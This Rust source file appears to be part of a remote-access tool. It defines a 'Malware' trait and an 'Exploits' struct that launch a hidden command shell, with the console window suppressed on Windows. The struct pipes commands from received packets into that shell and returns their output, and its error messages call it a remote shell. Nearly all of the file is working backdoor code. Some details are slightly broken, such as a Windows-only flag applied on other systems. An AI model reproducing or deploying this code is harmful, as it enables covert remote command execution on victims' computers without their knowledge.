use crate::structure::{Detector, StructStone};
use std::{
    io::{Read, Write},
    os::windows::process::CommandExt,
    process::{Child, ChildStderr, ChildStdin, ChildStdout, Command, Stdio},
    thread,
    time::Duration,
};

#[derive(Debug)]
pub struct Exploits {
    exploit_input: Vec<u8>,
    exploit_output: Vec<u8>,
    stdin_stream: Option<ChildStdin>,
    stdout_stream: Option<ChildStdout>,
    stderr_stream: Option<ChildStderr>,
}

impl Exploits {
    pub fn default() -> Exploits {
        let mut shell = Exploits::shell();
        Exploits {
            exploit_input: vec![],
            exploit_output: vec![],
            stdin_stream: shell.stdin,
            stdout_stream: shell.stdout,
            stderr_stream: shell.stderr,
        }
    }
    pub fn shell() -> Child {
        if cfg!(target_os = "windows") {
            Command::new("cmd")
                .creation_flags(0x08000000)
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .expect("Failed to start remote shell")
        } else {
            Command::new("sh")
                .creation_flags(0x08000000)
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .expect("Failed to start remote shell")
        }
    }

    fn read_buffer(&mut self, buffer_size: usize) -> Vec<u8> {
        let mut output: Vec<u8> = vec![0; buffer_size];
        thread::sleep(Duration::from_micros(500));

        let stdout = match &mut self.stdout_stream {
            Some(stdout) => stdout,
            None => return output,
        };

        let stderr = match &mut self.stderr_stream {
            Some(stderr) => stderr,
            None => return output,
        };

        loop {
            match stdout.read(&mut output) {
                Ok(bytes_read) if bytes_read != buffer_size => break,
                Ok(_) => {} // Continue loopContinue loop
                Err(e) => panic!("Failed to read from stdout: {}", e),
            }
            thread::sleep(Duration::from_micros(500))
        }

        if output.is_empty() {
            loop {
                match stderr.read(&mut output) {
                    Ok(bytes_read) if bytes_read != buffer_size => break,
                    Ok(_) => {} // Continue loop
                    Err(e) => panic!("Failed to read from stderr: {}", e),
                }
                thread::sleep(Duration::from_micros(500))
            }
        }

        output
    }
}

pub trait Malware {
    fn execute(&mut self);
    fn get_output(&mut self) -> Vec<u8>;
    fn command(&mut self, packet: StructStone) -> Vec<u8>;
}

impl Malware for Exploits {
    fn execute(&mut self) {
        if let Some(mut input_stream) = self.stdin_stream.as_mut() {
            println!("입력 {:?}", String::from_utf8(self.exploit_input.clone()));
            input_stream
                .write(&self.exploit_input)
                .expect("Failed to write to stdin");
            input_stream.flush().expect("Failed to write to stdin");
        }

        let mut output: Vec<u8> = self.read_buffer(2048);

        self.exploit_output = output.to_vec();
    }

    fn get_output(&mut self) -> Vec<u8> {
        self.exploit_output.clone()
    }

    fn command(&mut self, packet: StructStone) -> Vec<u8> {
        self.exploit_input = packet.get_command();
        self.exploit_input.extend(b"\n");
        self.execute();
        self.get_output()
    }
}
